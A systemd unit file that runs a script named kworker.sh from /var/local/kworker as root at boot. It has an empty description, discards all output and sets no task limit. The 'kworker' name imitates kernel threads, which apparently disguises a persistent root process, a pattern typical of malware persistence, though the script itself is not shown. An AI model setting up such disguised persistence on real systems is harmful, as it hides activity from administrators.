[Unit]
Description=
After=network.target
Wants=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/var/local/kworker
ExecStart=/var/local/kworker/kworker.sh
Restart=on-failure
RestartSec=10
StandardOutput=null
StandardError=null
TasksMax=infinity
CPUSchedulingPolicy=other

[Install]
WantedBy=multi-user.target